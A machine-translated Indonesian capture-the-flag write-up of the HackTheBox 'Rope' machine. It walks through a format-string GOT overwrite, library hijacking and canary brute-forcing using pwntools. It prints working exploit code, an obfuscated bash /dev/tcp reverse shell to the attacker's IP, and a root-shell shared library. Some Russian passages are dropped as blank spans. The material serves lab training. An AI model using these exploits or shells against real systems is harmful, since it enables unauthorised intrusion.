<!doctype html>
<html class="no-js" lang="id">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üõê üë©‚Äç‚ù§Ô∏è‚Äçüë® üïµÔ∏è Retas Kotak. Walkthrough Rope. PWN. Memformat string dan ROP menggunakan pwntools üçÉ ü•ì üôÖüèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Saya terus menerbitkan solusi yang dikirim untuk diproses lebih lanjut dari situs HackTheBox . 
 
 Pada artikel ini, kami mengumpulkan banyak pwn, yan...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Retas Kotak. Walkthrough Rope. PWN. Memformat string dan ROP menggunakan pwntools</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/503414/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/cl/ci/gs/clcigsntltvnbkltsfgppni4t0u.png" alt="gambar"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya terus menerbitkan solusi yang dikirim untuk </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">diproses lebih lanjut</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dari situs </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada artikel ini, kami mengumpulkan banyak pwn, yang akan kami pecahkan menggunakan pwntools. </font><font style="vertical-align: inherit;">Saya pikir ini akan bermanfaat bagi pembaca dengan tingkat kesadaran apa pun dalam topik ini. </font><font style="vertical-align: inherit;">Ayo pergi ... </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Koneksi ke laboratorium adalah melalui VPN. </font><font style="vertical-align: inherit;">Dianjurkan untuk tidak terhubung dari komputer kerja atau dari host di mana data penting bagi Anda tersedia, karena Anda masuk ke jaringan pribadi dengan orang-orang yang mengetahui sesuatu di bidang keamanan informasi :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informasi Organisasi</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mesin ini memiliki alamat IP 10.10.10.148, yang saya tambahkan ke / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.148    rope.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pertama, kami memindai port terbuka. </font><font style="vertical-align: inherit;">Karena butuh waktu lama untuk memindai semua port dengan nmap, saya akan melakukan ini dengan masscan. </font><font style="vertical-align: inherit;">Kami memindai semua port TCP dan UDP dari antarmuka tun0 dengan kecepatan 500 paket per detik.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.148 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/xf/d7/5k/xfd75kcmf_acjvyqtaprv-sc6bo.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang, untuk informasi lebih rinci tentang layanan yang beroperasi pada port, kami akan menjalankan pemindaian dengan opsi -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A rope.htb -p22,9999</code></pre><br>
<img src="https://habrastorage.org/webt/sd/tk/c3/sdtkc3orydw9_76o6c3gwryhlhc.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Host menjalankan SSH dan server web. </font><font style="vertical-align: inherit;">Kami akan pergi di web dan kami akan dipenuhi oleh formulir otorisasi. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/-h/zo/lz/-hzolzjpvg00y1l3v1y1mbnqpv8.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saat melihat pemindaian direktori, kami mendapatkan direktori yang tidak terindeks / (http: //rope.htb: 9999 //). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/79/jd/ix/79jdixhqpjhqhs0rsdkqg-hpluc.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan di direktori / opt / www kita menemukan file yang dapat dieksekusi - ini adalah server web kami.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ey/qz/fj/eyqzfjlf98744atrwnzsj3wsjsk.png" alt="gambar"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTPserver PWN</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Unduh dan lihat apa perlindungannya dengan checksec. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ch/xe/hx/chxehxx1ao9zlo9pk1wbttlrif8.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan demikian, kami memiliki aplikasi 32-bit dengan semua perlindungan yang diaktifkan, yaitu:</font></font><br>
<br>
<ul>
<li> NX (not execute) ‚Äî  ,   ,  ,     (    )    ,  ,    ,    .          .</li>
<li>ASLR:      (libc),          libc.     ret2libc.</li>
<li>PIE:  ,   ASLR,   ,     .         .</li>
<li>Canary:   ,         ,   .    ,     .      .</li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Karena kenyataan bahwa kita dapat membaca file di server, kita dapat membaca peta proses dari file yang dapat dieksekusi ini. </font><font style="vertical-align: inherit;">Ini akan memberi kita jawaban untuk pertanyaan-pertanyaan berikut:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Alamat apa program tersebut diunduh?</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dan di alamat apa perpustakaan digunakan olehnya dimuat?</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ayo lakukan itu.</font></font><br>
<br>
<pre><code class="bash hljs">curl <span class="hljs-string">"http://rope.htb:9999//proc/self/maps"</span> -H <span class="hljs-string">'Range: bytes=0-100000'</span></code></pre><br>
<img src="https://habrastorage.org/webt/ex/gp/v4/exgpv4as7ucyftbf6qpqxglysbc.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan demikian, kami memiliki dua alamat: 0x56558000 dan f7ddc000. </font><font style="vertical-align: inherit;">Pada saat yang sama, kita mendapatkan path ke libc library yang digunakan, unduh juga. </font><font style="vertical-align: inherit;">Sekarang, dengan mempertimbangkan semua yang ditemukan, kami akan membuat templat eksploit.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> base64<font></font>
<font></font>
host = <span class="hljs-string">'rope.htb'</span>
port = <span class="hljs-number">9999</span><font></font>
<font></font>
context.arch = <span class="hljs-string">'i386'</span>
binary= ELF(<span class="hljs-string">'./httpserver'</span>)<font></font>
libc = ELF(<span class="hljs-string">'./libc-2.27.so'</span>)<font></font>
bin_base = <span class="hljs-number">0x56558000</span> 
libc_base = <span class="hljs-number">0xf7ddc000</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang buka file itu sendiri untuk analisis di disassembler nyaman bagi Anda (dengan dekompiler). Saya menggunakan IDA dengan banyak plugin, dan sebelum saya duduk untuk analisis mendalam, saya lebih suka melihat segala sesuatu yang saya dapat kumpulkan dari plugin yang terbukti. Salah satunya adalah </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LazyIDA</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Dan untuk kueri "scan format string vuln" kita mendapatkan piring dengan fungsi yang berpotensi rentan. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ab/85/3d/ab853dd56ri3loneyejkce4snvm.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dari pengalaman menggunakan plugin ini, saya langsung menarik perhatian ke baris kedua (parameter formatnya). Kami beralih ke tempat penggunaan fungsi ini dan mendekompilasinya. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_7/iw/sg/_7iwsgc6cxf0rrpe3ruaoyolobi.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan tebakan dikonfirmasi, garis hanya dilewatkan ke fungsi printf. Mari cari tahu apa string ini. Mari kita pergi ke tempat panggilan ke fungsi log_access.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/0n/vr/1q/0nvr1qtnll7c_hab2jrqo-5fvdm.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi kami tertarik pada parameter ketiga, yang menandai IDA sebagai file. </font><font style="vertical-align: inherit;">Dan kami mendapatkan jawaban untuk semua pertanyaan hanya dengan melihat referensi silang ke variabel ini. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_s/i9/78/_si978isulkh-jme2gznkjftp98.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan demikian, ini adalah penunjuk ke string - nama file yang dibuka untuk dibaca. </font><font style="vertical-align: inherit;">Karena variabel ini adalah hasil dari fungsi parse_request (), file dibuka untuk dibaca, dan seluruh program adalah server web, kita dapat mengasumsikan bahwa ini adalah halaman yang diminta di server.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://127.0.0.1:9999/qwerty</code></pre><br>
<img src="https://habrastorage.org/webt/q9/xm/_z/q9xm_zyx9s78gbl0j8zzuf-mdns.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita periksa kerentanan string format.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://127.0.0.1:9999/$(python -c <span class="hljs-string">'print("AAAA"+"%25p"*100)'</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/cx/aq/73/cxaq731ejafj-dkjyg6kuliy1o0.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Baik! </font><font style="vertical-align: inherit;">Mari kita tentukan offset (berapa banyak% penspesifikasi yang perlu dikirim untuk mendapatkan 0x41414141 - AAAA di akhir output). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2i/lm/xr/2ilmxraso--gzeo2jqfwhwdtvom.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami mendapat 53. Periksa bahwa semuanya benar.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://127.0.0.1:9999/$(python -c <span class="hljs-string">'print("AAAA"+"%25p"*53)'</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/bl/dm/mg/bldmmgl809qsxgxdds44phkyqqi.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami tidak dapat memperoleh shell lokal, tetapi kami dapat menjalankan perintah, misalnya, melempar shell terbalik:</font></font><br>
<br>
<pre><code class="bash hljs">bash -i &gt;&amp; /dev/tcp/10.10.15.60/4321 0&gt;&amp;1</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tetapi untuk menghindari karakter tidak nyaman, kami akan menyandikannya di base64, maka shell call akan terlihat seperti ini:</font></font><br>
<br>
<pre><code class="bash hljs"><span class="hljs-built_in">echo</span> ‚ÄúYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42MC80MzIxIDA+JjEK‚Äù | base64 -d | bash -i</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan pada akhirnya, ganti semua spasi dengan konstruk $ IFS. </font><font style="vertical-align: inherit;">Kami mendapatkan perintah yang perlu Anda jalankan untuk mendapatkan koneksi kembali.</font></font><br>
<br>
<pre><code class="bash hljs"><span class="hljs-built_in">echo</span><span class="hljs-variable">$IFS</span><span class="hljs-string">"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42MC80MzIxIDA+JjEK"</span>|base64<span class="hljs-variable">$IFS</span>-d|bash<span class="hljs-variable">$IFS</span>-i</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita tambahkan ini ke kode:</font></font><br>
<br>
<pre><code class="python hljs">offset = <span class="hljs-number">53</span>
cmd = <span class="hljs-string">'bash -i &gt;&amp; /dev/tcp/10.10.15.60/4321 0&gt;&amp;1'</span>
shell = <span class="hljs-string">'echo$IFS"{}"|base64$IFS-d|bash$IFS-i'</span>.format(base64.b64encode(cmd))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang kembali ke string format kami. </font><font style="vertical-align: inherit;">Karena putf dipanggil after printf (), kita dapat menulis ulang alamatnya di GOT ke alamat fungsi sistem dari libc. </font><font style="vertical-align: inherit;">Berkat pwntools, ini sangat mudah dilakukan. </font><font style="vertical-align: inherit;">Misalkan Anda bisa mendapatkan alamat relatif dari fungsi put menggunakan binary.got ['puts'], juga mudah dengan fungsi sistem: libc.symbols ['system']. </font><font style="vertical-align: inherit;">Tentang garis format dan GOT saya jelaskan secara rinci dalam artikel tentang pwn, jadi di sini kita cukup mengumpulkan baris format menggunakan pwntools:</font></font><br>
<br>
<pre><code class="python hljs">writes = {(elf_base + binary.got[<span class="hljs-string">'puts'</span>]): (libc_base + libc.symbols[<span class="hljs-string">'system'</span>])}<font></font>
format_string = fmtstr_payload(offset, writes)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami mengumpulkan muatan akhir:</font></font><br>
<br>
<pre><code class="python hljs">payload = shell + <span class="hljs-string">" /"</span> + urllib.quote(format_string) + <span class="hljs-string">"\n\n"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami terhubung dan mengirim:</font></font><br>
<br>
<pre><code class="python hljs">p = remote(host,port)<font></font>
p.send(payload)<font></font>
p.close()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kode lengkapnya terlihat seperti ini. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/j7/tm/sa/j7tmsavnfi1jrlznbhrnylk1j2k.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ayo jalankan kode dan dapatkan koneksi kembali.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/54/xz/ko/54xzkogf-qq9btyjx9frthjmb3q.png" alt="gambar"><br>
<br>
<img src="https://habrastorage.org/webt/of/_v/ku/of_vkulfppu97eeudtalu5ivxge.png" alt="gambar"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PENGGUNA</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita periksa pengaturan sudo untuk mengeksekusi perintah tanpa kata sandi. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/5q/ai/0-/5qai0-4gkkxtn4o3vz9yk-pdu2o.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami melihat bahwa Anda dapat menjalankan readlog atas nama pengguna r4j. </font><font style="vertical-align: inherit;">Tidak ada kerentanan dalam aplikasi, GTFOBins juga tidak ada. </font><font style="vertical-align: inherit;">Mari kita lihat perpustakaan yang digunakan oleh aplikasi.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/b-/3i/-s/b-3i-sn8hhevvo4ger7j8gaiy7k.png" alt="gambar"><br>
<br>
<pre><code class="bash hljs">ls -l /lib/x86_64-linux-gnu/ | grep <span class="hljs-string">"liblog.so\|libc.so.6"</span></code></pre><br>
<img src="https://habrastorage.org/webt/eb/4e/rr/eb4errgawf8imvy0xmy_hgd-gta.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Artinya, kita bisa menulis ke file-file ini. </font><font style="vertical-align: inherit;">Mari kita tulis perpustakaan kita.</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printlog</span><span class="hljs-params">()</span></span>{<font></font>
    setuid(<span class="hljs-number">0</span>);<font></font>
    setgid(<span class="hljs-number">0</span>);<font></font>
    system(<span class="hljs-string">"/bin/sh"</span>);<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang kompilasi.</font></font><br>
<br>
<pre><code class="bash hljs">gcc -c -Wall -Werror -fpic liblog.c</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kumpulkan perpustakaan.</font></font><br>
<br>
<pre><code class="bash hljs">Gcc -shared -o liblog.so liblog.o</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kemudian kami mengunggah file ke host, menimpa perpustakaan dan menjalankan program. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bk/n-/ci/bkn-ciaotw1id-emk87tv6anp1k.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi kami mengambil pengguna.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AKAR</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk mendaftar sistem kami menggunakan linpeas. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/9k/nd/-k/9knd-k9gxwxz8hghzdwn7up8vbu.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi di localhost, port 1337 mendengarkan. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dz/xh/gs/dzxhgs3uf6d3jzmvdrfqpg0jsro.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seperti yang Anda lihat, pengguna kami adalah anggota grup adm. Mari kita lihat file yang tersedia untuk grup ini. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/39/jq/08/39jq08wmi0lzf8xb5b4hgkrwpay.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ada file yang menarik. Dan ini adalah program yang mendengarkan pada port. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u4/cf/up/u4cfuptixjubaydn3so9vv8iqnu.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dalam hal ini, aplikasi berjalan sebagai root. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bn/l8/qn/bnl8qnuxwllqpudd8mcuzrtchn0.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Unduh aplikasi itu sendiri dan perpustakaan libc yang digunakannya. Dan perhatikan bahwa ASLR aktif di host. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ye/u2/91/yeu291nh107sotdzw9i5hxmyoww.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Periksa perlindungan apa yang dimiliki aplikasi. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/lw/2q/0t/lw2q0t15j1qmapfuhy9oppeqkgg.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Semua maksimal. Yaitu, jika kita menemukan buffer overflow, kita perlu brute kenari (nilai yang diperiksa sebelum keluar dari fungsi untuk memeriksa integritas buffer), dan sebagai teknik untuk mengeksploitasi kerentanan, kita akan menggunakan ROP (yang saya tuliskan secara rinci)</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">di sini</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ). Mari kita buka program di disassembler dengan decompiler yang nyaman bagi Anda (saya menggunakan IDA Pro). Kami mendekompilasi fungsi utama. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/st/jx/lo/stjxlocl4sv3gh_6j8euvybdayq.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Contoh kenari adalah variabel v10, yang ditetapkan pada awal fungsi. Mari kita lihat apa fungsi sub_1267 bertanggung jawab. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/km/gi/aj/kmgiajki9-zlvdzxxfqaeqt2dn8.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi di sini kita buka port untuk mendengarkan. Anda dapat mengubah nama menjadi is_listen (); kita melangkah lebih jauh. Fungsi yang ditentukan pengguna berikut adalah sub_14EE. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/hn/mn/bn/hnmnbnmswumhkazbc6aysanetbc.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sebelum mengirim, ada fungsi pengguna lain. Kami melihatnya.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/2d/7k/fb/2d7kfbhkjqnz8eidg8i95km_yey.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi, dalam fungsi ini, string hingga 0x400 byte diterima dan ditulis ke buffer. </font><font style="vertical-align: inherit;">Komentar pada variabel buf menunjukkan alamat relatif ke dasar frame stack saat ini (rbp) - [rbp-40h], dan variabel v3 (canary) memiliki alamat relatif [rbp-8h], jadi untuk buffer overflow kita membutuhkan lebih banyak [rbp- 8h] - [rbp-40h] = 0x40-8 = 56 byte. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan demikian, rencananya adalah sebagai berikut:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">temukan dan limpahkan buffer;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">letakkan kenari, rbp dan rip;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sejak PIE diaktifkan, Anda perlu menemukan offset yang sebenarnya;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">menemukan kebocoran memori untuk menghitung alamat di mana perpustakaan dimuat;</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kumpulkan ROP, di mana aliran deskriptor standar akan dialihkan ke deskriptor jaringan program, dan kemudian panggil / bin / sh melalui fungsi sistem.</font></font></li>
</ol><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. buffer overflow</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seperti yang dapat dilihat di bawah ini, ketika mentransmisikan 56 byte, program ini terus bekerja secara normal, tetapi mentransmisikan 57 byte, kita mendapatkan pengecualian. </font><font style="vertical-align: inherit;">Dengan demikian, integritas buffer dilanggar. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/kc/pp/sl/kcppslliglpdyxf2v8ikppjoeqa.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita membuat templat eksploit. </font><font style="vertical-align: inherit;">Karena akan perlu untuk memilah-milah dan menghubungkan kembali banyak, kami akan menonaktifkan output dari pwntools (log_level) pesan.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
HOST = <span class="hljs-string">'127.0.0.1'</span>
PORT = <span class="hljs-number">1337</span>
context(os = <span class="hljs-string">"linux"</span>, arch = <span class="hljs-string">"amd64"</span>, log_level=<span class="hljs-string">'error'</span>)<font></font>
<font></font>
pre_payload = <span class="hljs-string">"A"</span> * <span class="hljs-number">56</span><font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
<font></font>
context.log_level=<span class="hljs-string">'info'</span><font></font>
r.interactive()<font></font>
</code></pre><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.Canary, RBP, RIP</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seperti yang kita ketahui, setelah 56 byte buffer ada kenari, dan setelah itu ada alamat RBP dan RIP di stack, yang juga perlu disortir. </font><font style="vertical-align: inherit;">Mari kita menulis fungsi pencocokan 8 byte.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">qword_brute</span>(<span class="hljs-params">pre_payload, item</span>):</span>
    qword_ = <span class="hljs-string">b""</span>
    <span class="hljs-keyword">while</span> len(qword_) &lt; <span class="hljs-number">8</span>:
        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):<font></font>
            byte = bytes([b])<font></font>
            <span class="hljs-keyword">try</span>:<font></font>
                r = remote(HOST, PORT)<font></font>
                print(<span class="hljs-string">f"<span class="hljs-subst">{item}</span> find: <span class="hljs-subst">{(qword_ + byte).hex()}</span>"</span>, end=<span class="hljs-string">u"\u001b[1000D"</span>)<font></font>
                send_ = pre_payload + qword_ + byte<font></font>
                r.sendafter(<span class="hljs-string">b"admin:"</span>, send_)
                <span class="hljs-keyword">if</span> <span class="hljs-string">b"Done"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.recvall(timeout=<span class="hljs-number">5</span>):
                    <span class="hljs-keyword">raise</span> EOFError<font></font>
                r.close()<font></font>
                qword_ += byte<font></font>
                <span class="hljs-keyword">break</span>
            <span class="hljs-keyword">except</span> EOFError <span class="hljs-keyword">as</span> error:<font></font>
                r.close()<font></font>
    context.log_level=<span class="hljs-string">'info'</span>            
    log.success(<span class="hljs-string">f"<span class="hljs-subst">{item}</span> found: <span class="hljs-subst">{hex(u64(qword_))}</span>"</span>)<font></font>
    context.log_level=<span class="hljs-string">'error'</span> 
    <span class="hljs-keyword">return</span> qword_
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi kami dapat membuat pre_payload:</font></font><br>
<br>
<pre><code class="python hljs">pre_payload = <span class="hljs-string">b"A"</span> * <span class="hljs-number">56</span>
CANARY = qword_brute(pre_payload, <span class="hljs-string">"CANARY"</span>)<font></font>
pre_payload += CANARY<font></font>
RBP = qword_brute(pre_payload, <span class="hljs-string">"RBP"</span>)<font></font>
pre_payload += RBP<font></font>
RIP = qword_brute(pre_payload, <span class="hljs-string">"RIP"</span>)
</code></pre><br>
